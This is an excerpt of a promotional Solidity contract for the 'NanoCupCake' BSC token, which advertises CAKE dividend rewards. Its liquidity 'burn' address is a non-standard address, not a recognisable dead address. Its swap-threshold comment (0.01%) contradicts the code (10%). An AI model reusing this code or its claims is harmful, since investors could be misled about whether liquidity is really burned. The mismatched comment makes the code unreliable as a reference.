...
// 
// $NanoCupCake proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
// simply hold $NanoCupCake and you'll receive CAKE automatically in your wallet.
// 
// Hold NanoCupCake and get rewarded in Cake on every transaction!
//
//
// 📱 Telegram: https://t.me/cupcBSC
// 🌎 Website: https://nanocake.club
// 🌐 Twitter: https://twitter.com/nanocupcakeBSC
//
//
//  🌝 Deployed by py_master
//
//  🙏🏻 SRI LAKSHMI NARASHIMHA SWAMY 
//
//  🙎🏽‍♂️🙍🏽‍♀️    AMMA NANA ki Ankitam
//
//    
//
//
...
contract NanoCupCake is IBEP20, Auth {
    using SafeMath for uint256;

    address CAKE = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0xaD51E1612dC57aaf5cB3966ee958159cd70e1162;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "NanoCupCake";
    string constant _symbol = "NCAKE";
    ...
    uint256 public swapThreshold = _totalSupply * 10 / 100; // 0.01% of supply
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //TestNet: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 Mainnet: 0x10ED43C718714eb63d5aA57B78B54704E256024E
        ...
        // NICE! -- Added Liquidity is sent to Dead 
